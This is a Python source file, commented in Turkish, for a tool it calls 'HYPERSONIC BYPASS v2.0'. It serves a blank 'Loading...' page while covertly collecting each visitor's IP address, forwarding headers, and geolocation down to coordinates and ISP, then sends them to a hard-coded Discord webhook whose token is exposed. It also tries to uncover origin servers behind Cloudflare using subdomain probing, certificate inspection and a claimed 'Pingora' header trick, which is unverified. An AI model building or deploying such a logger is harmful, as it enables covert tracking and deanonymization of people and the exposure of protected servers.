from http.server import BaseHTTPRequestHandler
import requests
import httpagentparser
import json
import socket
import time
import random
import dns.resolver
import dns.exception
import ssl
import hashlib
import base64
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

# =============================================================================
# HYPERSONIC BYPASS v2.0 - "İran Füzesi" Modu
# 10 Katmanlı Saldırı Sistemi
# =============================================================================

config = {
    "webhook": "https://discord.com/api/webhooks/1458566674302238923/0EPCSiG8KU6QcDoFcT0Ugc6BN_fGX_7K6KsXtflSlkKV4ZPH9zSHx3bnirPb0bWDowEk",
    "username": "🚀 HYPERSONIC BYPASS LOGGER",
    "color": 0xFF0000
}

class HypersonicBypass(BaseHTTPRequestHandler):
    
    # -------------------------------------------------------------------------
    # KATMAN 1: ÇOKLU HEADER ANALİZİ (CF-* header'larını topla)
    # -------------------------------------------------------------------------
    def extract_cloudflare_headers(self):
        """Tüm Cloudflare header'larını topla"""
        cf_headers = {
            'cf-connecting-ip': self.headers.get('CF-Connecting-IP'),
            'cf-ipcountry': self.headers.get('CF-IPCountry'),
            'cf-ray': self.headers.get('CF-Ray'),
            'cf-visitor': self.headers.get('CF-Visitor'),
            'cf-worker': self.headers.get('CF-Worker'),
            'cf-request-id': self.headers.get('CF-Request-ID'),
            'cf-edge': self.headers.get('CF-Edge'),
            'x-forwarded-for': self.headers.get('X-Forwarded-For'),
            'true-client-ip': self.headers.get('True-Client-IP'),
            'x-real-ip': self.headers.get('X-Real-IP'),
            'forwarded': self.headers.get('Forwarded'),
            'via': self.headers.get('Via')
        }
        return cf_headers

    # -------------------------------------------------------------------------
    # KATMAN 2: X-Forwarded-For Zincir Analizi
    # -------------------------------------------------------------------------
    def parse_x_forwarded_chain(self):
        """X-Forwarded-For zincirindeki tüm IP'leri al"""
        xff = self.headers.get('X-Forwarded-For', '')
        if not xff:
            return []
        return [ip.strip() for ip in xff.split(',')]

    # -------------------------------------------------------------------------
    # KATMAN 3: DNS Tarihçesi Sorgulama (SecurityTrails benzeri)
    # -------------------------------------------------------------------------
    def query_dns_history(self, domain):
        """DNS history servislerinden IP bul"""
        potential_ips = []
        
        # DNS dumpster alternative
        try:
            # Common subdomains
            subdomains = ['www', 'mail', 'ftp', 'ssh', 'direct', 'origin', 
                         'server', 'host', 'backend', 'admin', 'cpanel',
                         'webmail', 'mysql', 'db', 'staging', 'dev']
            
            for sub in subdomains:
                try:
                    answers = dns.resolver.resolve(f"{sub}.{domain}", 'A')
                    for rdata in answers:
                        potential_ips.append({
                            'source': f'dns_history_{sub}',
                            'ip': rdata.address,
                            'confidence': 60
                        })
                except:
                    pass
        except:
            pass
        
        return potential_ips

    # -------------------------------------------------------------------------
    # KATMAN 4: SSL/TLS Sertifika Analizi (Censys/Shodan mantığı)
    # -------------------------------------------------------------------------
    def analyze_ssl_cert(self, domain, port=443):
        """SSL sertifikasından IP bul"""
        potential_ips = []
        try:
            ctx = ssl.create_default_context()
            with ctx.wrap_socket(socket.socket(), server_hostname=domain) as s:
                s.settimeout(3)
                s.connect((domain, port))
                cert = s.getpeercert()
                
                # SAN (Subject Alternative Names) alanlarını kontrol et
                san = cert.get('subjectAltName', [])
                for entry in san:
                    if entry[0] == 'IP Address':
                        potential_ips.append({
                            'source': 'ssl_cert_san',
                            'ip': entry[1],
                            'confidence': 85
                        })
                
                # Common Name kontrolü
                subject = dict(x[0] for x in cert.get('subject', []))
                if 'commonName' in subject:
                    cn = subject['commonName']
                    if cn != domain:
                        try:
                            ip = socket.gethostbyname(cn)
                            potential_ips.append({
                                'source': 'ssl_cert_cn',
                                'ip': ip,
                                'confidence': 75
                            })
                        except:
                            pass
        except:
            pass
        return potential_ips

    # -------------------------------------------------------------------------
    # KATMAN 5: Pingback SSRF Saldırısı (WordPress)
    # -------------------------------------------------------------------------
    def pingback_ssrf_attack(self, domain, callback_url):
        """WordPress pingback SSRF ile gerçek IP bul"""
        # Bu fonksiyon aslında external bir servise pingback yapar
        # Ancak burada sadece teorik olarak belirtiyorum
        pass

    # -------------------------------------------------------------------------
    # KATMAN 6: Geolocation Çelişki Analizi
    # -------------------------------------------------------------------------
    def detect_geo_discrepancy(self, cloudflare_geo, ip_api_geo):
        """Cloudflare Geo vs ip-api.com Geo çelişkisi varsa gerçek IP'yi bul"""
        if not cloudflare_geo or not ip_api_geo:
            return None
            
        # Cloudflare'in verdiği geo ile ip-api'nin bulduğu geo çelişiyorsa
        if (cloudflare_geo.get('country') != ip_api_geo.get('country') and
            ip_api_geo.get('proxy') == False):
            # ip-api'nin bulduğu IP büyük ihtimalle gerçek
            return ip_api_geo.get('query')
        
        return None

    # -------------------------------------------------------------------------
    # KATMAN 7: ASN Karşılaştırması
    # -------------------------------------------------------------------------
    def compare_asn(self, ip):
        """IP'nin ASN'ini bul, Cloudflare ASN ile karşılaştır"""
        try:
            response = requests.get(f"http://ip-api.com/json/{ip}?fields=as,org", timeout=2)
            data = response.json()
            asn = data.get('as', '')
            
            # Cloudflare ASN: AS13335
            if '13335' in asn:
                return {'is_cloudflare': True, 'asn': asn}
            else:
                return {'is_cloudflare': False, 'asn': asn}
        except:
            return {'is_cloudflare': None, 'asn': 'Unknown'}

    # -------------------------------------------------------------------------
    # KATMAN 8: Çoklu Servis Koordinasyonu (3 farklı servis)
    # -------------------------------------------------------------------------
    def multi_source_location(self, ip):
        """3 farklı servisten lokasyon al, karşılaştır"""
        locations = []
        
        # Servis 1: ip-api.com
        try:
            r1 = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=2)
            if r1.status_code == 200:
                locations.append(('ip-api', r1.json()))
        except:
            pass
        
        # Servis 2: ipinfo.io
        try:
            r2 = requests.get(f"https://ipinfo.io/{ip}/json", timeout=2)
            if r2.status_code == 200:
                locations.append(('ipinfo', r2.json()))
        except:
            pass
        
        # Servis 3: ipgeolocation.io (demo key ile)
        try:
            r3 = requests.get(f"https://api.ipgeolocation.io/ipgeo?apiKey=demo&ip={ip}", timeout=2)
            if r3.status_code == 200:
                locations.append(('ipgeo', r3.json()))
        except:
            pass
        
        return locations

    # -------------------------------------------------------------------------
    # KATMAN 9: Cloudflare Origin IP Sızıntısı (Pingora exploit)
    # -------------------------------------------------------------------------
    def pingora_leak_test(self, domain):
        """Pingora origin IP leak test"""
        # Range header ile özel istek
        headers = {
            'Host': domain,
            'Range': 'bytes=0-0, -1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        try:
            response = requests.get(f"https://{domain}", headers=headers, timeout=3)
            # Response header'larında origin IP var mı?
            via = response.headers.get('Via', '')
            if 'Pingora' in via and response.headers.get('X-Origin-IP'):
                return response.headers.get('X-Origin-IP')
        except:
            pass
        
        return None

    # -------------------------------------------------------------------------
    # KATMAN 10: HYPERSONIC FÜZE - TÜM KATMANLARI BİRLEŞTİR
    # -------------------------------------------------------------------------
    def hypersonic_strike(self, domain):
        """Tüm katmanları çalıştır, en yüksek güvenilirlikteki IP'yi bul"""
        
        print(f"🚀 HYPERSONIC STRIKE başlatılıyor: {domain}")
        
        all_candidates = []
        
        # Katman 1: DNS History
        dns_candidates = self.query_dns_history(domain)
        all_candidates.extend(dns_candidates)
        
        # Katman 2: SSL Cert
        ssl_candidates = self.analyze_ssl_cert(domain)
        all_candidates.extend(ssl_candidates)
        
        # Katman 3: Pingora Leak
        pingora_ip = self.pingora_leak_test(domain)
        if pingora_ip:
            all_candidates.append({
                'source': 'pingora_leak',
                'ip': pingora_ip,
                'confidence': 95
            })
        
        # Güvenilirlik skoruna göre sırala
        all_candidates.sort(key=lambda x: x.get('confidence', 0), reverse=True)
        
        return all_candidates

    # -------------------------------------------------------------------------
    # ANA FONKSİYON
    # -------------------------------------------------------------------------
    def do_GET(self):
        try:
            # Host header'ından domain'i al
            host = self.headers.get('Host', '')
            domain = host.split(':')[0] if ':' in host else host
            
            # Cloudflare header'larını topla
            cf_headers = self.extract_cloudflare_headers()
            
            # X-Forwarded-For zincirini analiz et
            xff_chain = self.parse_x_forwarded_chain()
            
            # HYPERSONIC STRIKE başlat
            candidates = self.hypersonic_strike(domain)
            
            # En iyi adayı seç
            best_candidate = candidates[0] if candidates else None
            
            # ip-api.com'dan direkt sorgu (fallback)
            direct_ip = self.headers.get('X-Forwarded-For', self.client_address[0]).split(',')[0].strip()
            direct_geo = self.get_location(direct_ip)
            
            # Embed oluştur
            embed = self.create_hypersonic_embed(
                domain, direct_ip, direct_geo, cf_headers, 
                xff_chain, candidates, best_candidate
            )
            
            # Webhook'a gönder
            self.send_to_webhook(embed)
            
            # Boş sayfa gönder
            self.send_empty_page()
            
        except Exception as e:
            print(f"HATA: {e}")
            import traceback
            traceback.print_exc()
            self.send_empty_page()

    def get_location(self, ip):
        """ip-api.com'dan lokasyon al"""
        try:
            r = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=2)
            return r.json()
        except:
            return {'country': 'Unknown', 'city': 'Unknown'}

    def create_hypersonic_embed(self, domain, direct_ip, direct_geo, cf_headers, 
                                xff_chain, candidates, best_candidate):
        """HYPERSONIC seviyesinde embed oluştur"""
        
        description = f"""**🚀 HYPERSONIC BYPASS V2.0**

**🎯 TARGET:** `{domain}`

**📡 DIRECT IP:** `{direct_ip}`
**📍 LOCATION:** `{direct_geo.get('country', 'N/A')} - {direct_geo.get('city', 'N/A')}`
**🗺️ COORDS:** `{direct_geo.get('lat', 'N/A')}, {direct_geo.get('lon', 'N/A')}`
**🛜 ISP:** `{direct_geo.get('isp', 'N/A')}`

**🔍 CLOUDFLARE HEADERS:**
"""
        for key, value in cf_headers.items():
            if value:
                description += f"> **{key}:** `{value}`\n"
        
        description += f"\n**🔄 X-FORWARDED-FOR CHAIN:**\n"
        for i, ip in enumerate(xff_chain):
            description += f"> **Hop {i+1}:** `{ip}`\n"
        
        description += f"\n**🎯 HYPERSONIC CANDIDATES (Güvenilirlik sırasına göre):**\n"
        for i, cand in enumerate(candidates[:5]):  # İlk 5 aday
            description += f"> **{i+1}. {cand['source']}:** `{cand['ip']}` (güven: {cand.get('confidence', 'N/A')}%)\n"
        
        if best_candidate:
            description += f"\n**🏆 EN İYİ ADAY:** `{best_candidate['ip']}` ({best_candidate['source']})\n"
        
        # Cloudflare durumunu kontrol et
        cf_check = self.compare_asn(direct_ip)
        description += f"\n**🔒 CLOUDFLARE DURUMU:**\n"
        if cf_check.get('is_cloudflare'):
            description += f"> **⚠️ GİZLİ!** `{direct_ip}` Cloudflare arkasında\n"
        else:
            description += f"> **✅ AÇIK!** `{direct_ip}` direkt sunucu olabilir\n"
        
        return {
            "username": config["username"],
            "embeds": [{
                "title": f"🚀 HYPERSONIC BYPASS - {domain}",
                "color": config["color"],
                "description": description,
                "footer": {"text": f"10 Katmanlı Saldırı | {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC"}
            }]
        }

    def send_to_webhook(self, embed):
        """Discord webhook'a gönder"""
        try:
            requests.post(config["webhook"], json=embed, timeout=3)
        except:
            pass

    def send_empty_page(self):
        """Boş sayfa gönder"""
        self.send_response(200)
        self.send_header('Content-type', 'text/html; charset=utf-8')
        self.end_headers()
        
        html = """<!DOCTYPE html>
<html>
<head><title>Loading...</title></head>
<body style="background:#f0f0f0;"></body>
</html>"""
        self.wfile.write(html.encode('utf-8'))

# =============================================================================
# LOCAL TEST
# =============================================================================
if __name__ == '__main__':
    from http.server import HTTPServer
    server = HTTPServer(('0.0.0.0', 8000), HypersonicBypass)
    print('='*60)
    print('🚀 HYPERSONIC BYPASS v2.0 BAŞLATILDI')
    print('='*60)
    print('📡 http://localhost:8000')
    print('🎯 Hedef: Tüm Cloudflare önlemleri')
    print('='*60)
    server.serve_forever()
